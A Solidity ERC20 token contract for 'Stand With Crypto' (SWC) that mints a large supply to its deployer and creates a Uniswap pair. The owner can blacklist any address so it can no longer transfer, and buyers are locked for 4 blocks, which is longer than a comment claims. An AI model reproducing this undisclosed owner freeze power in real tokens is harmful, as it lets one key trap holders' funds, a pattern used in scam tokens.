//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "../utils/ERC20.sol";

interface IUNI {
    function createPair(address, address) external returns (address);
}

contract SWC is ERC20 {

    /// @notice Uniswap V2 (UNI-V2) SWC - WETH pair address
    address public immutable swcPair;
    /// @notice After purchase, selling is not allowed in the current block to prevent arbitrage bot attacks.
    mapping(address => uint256) public freezedBlock;

    address public owner;

    mapping(address => bool) public blackList;
    event BlackList(address indexed account, bool value);

    modifier onlyOwner {
        require(msg.sender == owner, "only owner");
        _;
    }

    function name() public pure returns (string memory) {
        return "Stand With Crypto";
    }

    function symbol() public pure returns (string memory) {
        return "SWC";
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

    function setBlackList(address[] calldata _accounts, bool[] calldata _values) external onlyOwner {
        for(uint i = 0; i < _accounts.length; i++) {
            blackList[_accounts[i]] = _values[i];
            emit BlackList(_accounts[i], _values[i]);
        }
    }

    function setOwner(address _owner) external onlyOwner {
        owner = _owner;
    }

    constructor(
        address _factory,
        address _weth
    ) {
        _mint(msg.sender, 120_000_000_000_000 ether);
        swcPair = IUNI(_factory).createPair(address(this), _weth);
        owner = msg.sender;
    }

    function _transfer(
        address from,
        address to,
        uint value
    ) internal override {
        require(!blackList[from], "locked");
        require(block.number >= freezedBlock[from], "not allowed current block");
        // @dev buy and remove liquidity
        if (from == swcPair) {
            // @dev After purchase, the account will be temporarily locked for 4 blocks.
            freezedBlock[to] = block.number + 4;
        }
        _balanceOf[from] -= value;
        _balanceOf[to] += value;
        emit Transfer(from, to, value);
    }

    function burn(uint256 amount) external {
        _burn(msg.sender, amount);
    }
}